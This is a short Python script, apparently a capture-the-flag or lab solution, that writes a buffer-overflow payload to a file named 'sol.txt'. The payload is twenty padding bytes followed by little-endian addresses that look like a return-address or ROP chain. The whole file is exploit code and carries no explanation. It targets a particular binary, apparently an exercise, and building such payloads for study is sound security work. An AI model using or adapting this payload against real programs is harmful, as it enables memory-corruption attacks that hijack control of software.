result = 20 * [0x61] + [0x60, 0x14,0x40, 0x00] + [0xe1, 0x14, 0x40, 0x00] + [0x00, 0x00, 0x00, 0x00] + [0x70, 0x70, 0x40,0x00]
with open('sol.txt', 'wb') as f:
    new_byte_array = bytearray(result)
    f.write(new_byte_array)